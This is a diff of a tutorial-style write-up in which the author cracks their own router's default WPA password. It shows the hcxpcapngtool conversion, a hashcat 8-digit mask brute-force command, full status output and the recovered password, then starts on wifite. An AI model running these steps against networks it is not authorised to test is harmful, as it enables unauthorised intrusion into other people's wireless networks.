@@ -32,8 +32,10 @@ In root mode i copied my file into /mnt and it automatically shared with my main
 hcxpcapngtool -o test.hc22000 test.cap
 
 Since it's my router, i know that the password is 8 numbers (it's the default password...VERY important to ALWAYS change the default password!!!!)
-So lets win out the password:
+
+Lets win out the password:
 hashcat -m 22000 -a 3 test.hc22000 ?d?d?d?d?d?d?d?d
+
 Session..........: hashcat
 Status...........: Running
 Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
@@ -53,7 +55,7 @@ Candidate.Engine.: Device Generator
 Candidates.#01...: 62878278 -> 67988378
 Hardware.Mon.#01.: Temp: 61c Util: 96% Core:2415MHz Mem:8001MHz Bus:8
 
-So I have 4 mins 20 secs until I will get the password...
+I have 4 mins 20 secs until I will get the password...
 And it's done:
 1dae468edd9bbffc76696aeb7a8b6591:98ded04e055a:94f8273e8b54:TP-LINK_055A:38643248
                                                           
@@ -80,7 +82,7 @@ Started: Wed Feb 18 14:31:21 2026
 Stopped: Wed Feb 18 14:35:28 2026
 
 So the password is: 38643248
-
+-------------------------------------------------------------------------------------------------------------------------------------
 Lets see another way (which is so much easier)
 Lets use wifite...
 Command is:
